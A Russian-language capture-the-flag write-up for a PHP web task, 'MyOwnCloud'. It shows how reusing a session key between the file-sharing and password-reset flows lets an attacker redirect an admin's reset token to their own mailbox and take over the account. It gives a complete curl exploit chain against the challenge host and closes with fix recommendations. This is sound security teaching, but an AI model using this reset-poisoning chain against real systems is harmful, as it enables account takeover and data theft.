# Не влезай — ужалит (MyOwnCloud) — технический разбор

**Флаг:** `avito{yOuROWnCLoUD_BuT_no7_Your_0wn_fILes}`
**Класс:** Web · PHP · session-state confusion · password-reset poisoning

## Краткое техническое резюме

Password-reset flow хранит target user ID и delivery address в независимых session keys:
`reset_user_id` и `contact_email`. Ключ `contact_email` также изменяется несвязанным file-sharing flow.
В пределах одной PHP session reset инициируется для администратора, после чего file-sharing request
подменяет адрес доставки. Backend создаёт token для административного `user_id`, но отправляет его на
контролируемый e-mail. Token-based reset не применяет immutable-account policy, поэтому цепочка
завершается account takeover и скачиванием `wiring-diagram.txt`.

---

**Для воспроизведения:** Нужны работающий MyOwnCloud и доступный внешний mailbox. Solver создаёт два аккаунта и использует mail.tm; локальный MailHog из исходников является отдельным способом доставки.

## 1. Контекст и цель

MyOwnCloud реализует аутентификацию, загрузку и скачивание файлов, sharing по e-mail и password reset.
Нужно получить файл `wiring-diagram.txt`, принадлежащий
аккаунту `admin@cloudbox.local`.

Материалы включают endpoint `https://notrespassing-0lcz8q7e.avitoctf.ru/` и исходники —
`notrespassing_5e6d73a.zip` (PHP-приложение `services/app` + Flask-микросервис рассылки писем
`services/sender` + `docker-compose.yml` с MailHog для локальной разработки).

## 2. Разведка и поверхность атаки

Стек: PHP 8.3 без framework, custom router, SQLite и встроенный development server. Отдельный
Python/Flask-сервис `sender` отправляет письма по SMTP; локальная конфигурация использует MailHog.

Карта endpoints (`config/routes.php`):

```
GET/POST /login, /register, POST /logout
GET      /files , POST /files/upload , GET /files/download?id= , POST /files/share
GET      /password/forgot , POST /password/forgot/request , POST /password/forgot/finalize
GET      /password/reset , POST /password/reset
GET      /password/change , POST /password/change
```

Модель данных (`bootstrap.php`): таблицы `users`, `files`, `shares`, `password_resets`. При первом
запуске создаётся `admin@cloudbox.local` (пароль — случайная строка в target environment) и сразу —
файл `wiring-diagram.txt` с флагом. На filesystem он хранится под случайным именем вне document root.

Аутентификация использует `password_hash`/`password_verify`; запросы в `Models/*` построены через
parameterized PDO statements. Эксплуатационная поверхность находится не в SQL-слое, а в общем
session state двух независимых business flows.

## 3. Анализ и проверка гипотез

**Наблюдение 1 — асимметричная защита административного аккаунта.** В коде реализовано ограничение
действий для `admin@cloudbox.local`: `FileController::upload()` (строка 32) запрещает загрузку файлов;
`PasswordResetController::requireMutableUser()` (строки 159–168) блокирует `showChange()` и
`changePassword()`. Аналогичной проверки нет в `showReset()` и `resetPassword()`, обслуживающих
`/password/reset`. Immutable-account policy применяется только к password change, но не к token-based
password reset.

**Гипотеза 1.** Если создать reset token, привязанный к `user_id` администратора, можно отправить
`POST /password/reset`, установить новый пароль администратора, а затем обратиться к
`/files/download?id=1` в его authenticated session.

**Проверка.** `PasswordResetController::requestReset()` (строки 38–57) ищет пользователя по e-mail
без ограничений; `admin@cloudbox.local` также принимается. Запрос
`POST /password/forgot/request` с `email=admin@cloudbox.local` создаёт в session
`reset_user_id = <id администратора>`. Ответ
`GET /password/forgot` подтверждает принятие запроса и отображает маскированный адрес
`a•••@cloudbox.local`.

**Наблюдение 2 — session-key reuse.** Token создаётся и отправляется по e-mail только внутри
`finalizeReset()` (строки 59–92), причём адрес получателя берётся из
`$_SESSION['contact_email']` (строка 62), а не из user record. Тот же ключ `contact_email`
независимо используется в `FileController::share()` (строка 130): при любом
успешном file-sharing request он перезаписывается на адрес получателя. Это независимый business flow,
использующий тот же session key.

**Гипотеза 2.** В одной session можно запросить password reset для администратора, установив
`reset_user_id = adminId` и `contact_email = admin@cloudbox.local`, а до вызова `finalize` отправить
`POST /files/share` с контролируемым адресом. `share()` перезапишет `contact_email`, не изменяя
`reset_user_id`.
Тогда `finalizeReset()` создаст token для администратора, но отправит его на контролируемый адрес.

**Проверка.** После `POST /files/share` с
`email=attacker1b@example.com` endpoint `/password/forgot` отображает маскированный адрес
`a•••@example.com` вместо `a•••@cloudbox.local`, при этом `reset_user_id` сохраняется. Это подтверждает
рассинхронизацию reset target и delivery address.

`FileController::share()` требует существующего recipient account, поэтому контролируемый адрес
предварительно регистрируется в приложении. Runtime-конфигурация `sender` доставляет сообщения на этот
внешний mailbox; reset token извлекается через API mail.tm.

## 4. Корневая причина

Exploit chain включает два application defects в `PasswordResetController.php` и
`FileController.php`, а также доступный delivery channel:

1. **Session-key reuse.** `requestReset()` (строки 53–54) пишет
   `$_SESSION['contact_email']` и `$_SESSION['reset_user_id']` как единый reset context.
   `share()` (строка 130) пишет в **тот же** `$_SESSION['contact_email']` для независимого file-sharing
   flow. `finalizeReset()` (строки 61–62) читает оба значения раздельно,
   предполагая их согласованность. `reset_user_id` остаётся от одного action, а `contact_email` — от
   другого. В результате reset token административного аккаунта отправляется на адрес атакующего.
2. **Неполное применение immutable-account policy.** `resetPassword()` (строки 100–122) не вызывает
   `requireMutableUser()`, тогда как `showChange()` и `changePassword()` проверяют
   `IMMUTABLE_USER_EMAIL === 'admin@cloudbox.local'` (строка 162). Reset token, связанный с
   `user_id` администратора, позволяет вызвать `User::setPassword($adminId, ...)`.
3. **Delivery primitive.** `sender` принимает адрес из `contact_email` без дополнительной привязки к
   reset target и доставляет письмо во внешний mailbox.

## 5. Эксплуатация

Ниже приведены запросы для двух аккаунтов; второй зарегистрирован на mailbox mail.tm с API-доступом.
`solve_notrespassing.py` автоматизирует эту последовательность.

```bash
uv run python notrespassing/solve_notrespassing.py \
  https://notrespassing-0lcz8q7e.avitoctf.ru
```

```bash
BASE="https://notrespassing-0lcz8q7e.avitoctf.ru"

# 0) Регистрация аккаунта атакующего
curl -s -c cookies.txt -X POST "$BASE/register" \
  --data-urlencode "email=attacker1a@example.com" --data-urlencode "password=SuperSecret123"
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/login" \
  --data-urlencode "email=attacker1a@example.com" --data-urlencode "password=SuperSecret123"

# 0b) Регистрация второго аккаунта на контролируемый e-mail
MYADDR="notresp123@web-library.net"
curl -s -X POST "$BASE/register" --data-urlencode "email=$MYADDR" --data-urlencode "password=SuperSecret123"

# 0c) Загрузка файла, необходимого для вызова share()
printf 'bait\n' | curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/files/upload" \
  -F 'upload=@-;filename=bait.txt;type=text/plain'
FILE_ID=$(curl -s -b cookies.txt "$BASE/files" \
  | grep -oE 'download\?id=[0-9]+' | tail -1 | cut -d= -f2)

# 1) Инициализация password reset для администратора
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/password/forgot/request" \
  --data-urlencode "email=admin@cloudbox.local"
# session state: reset_user_id = <id admin>, contact_email = admin@cloudbox.local

# 2) Вызов share() для файла атакующего и контролируемого адреса —
#    изменяется $_SESSION['contact_email']; reset_user_id сохраняется
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/files/share" \
  --data-urlencode "file_id=$FILE_ID" --data-urlencode "email=$MYADDR"
# session state: reset_user_id = <id admin>, contact_email = $MYADDR

# 3) Завершение reset: token относится к администратору, письмо доставляется атакующему
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/password/forgot/finalize"

# 4) Получение письма через api.mail.tm и извлечение TOKEN
TOKEN="<48-hex-символов из письма 'Токен сброса: ...'>"

# 5) Установка нового пароля администратора
curl -s -X POST "$BASE/password/reset" \
  --data-urlencode "token=$TOKEN" --data-urlencode "password=PwnedAdmin123!"

# 6) Аутентификация как admin@cloudbox.local
curl -s -c admin_cookies.txt -X POST "$BASE/login" \
  --data-urlencode "email=admin@cloudbox.local" --data-urlencode "password=PwnedAdmin123!"

# 7) Скачивание wiring-diagram.txt (id=1, создан bootstrap.php)
curl -s -b admin_cookies.txt "$BASE/files/download?id=1"
```

## 6. Флаг

```
avito{yOuROWnCLoUD_BuT_no7_Your_0wn_fILes}
```

## 7. Выводы и рекомендации

- Session keys должны иметь одну ответственность. Адрес password-reset delivery не должен зависеть
  от state, изменяемого file-sharing flow; его следует получать из user record, связанной с reset
  token.
- Authorization policy для immutable account должна применяться централизованно ко всем credential-
  mutation paths: password change, password reset и административным API.
- Reset context следует хранить как единую server-side запись с target user, destination, expiry,
  single-use status и криптографически случайным token, а не как независимо изменяемые session fields.

## 8. Файлы для воспроизведения

В репозитории:

- `solve_notrespassing.py` — end-to-end solver: регистрация двух аккаунтов, mailbox mail.tm,
  session-state poisoning, получение token, reset пароля и скачивание флага.

Исходный архив не входит в набор файлов в Git. Ожидаемый локальный путь —
`notrespassing/notrespassing_5e6d73a.zip`; extracted source tree размещается в
`notrespassing/src/notrespassing/` и также остаётся ignored.
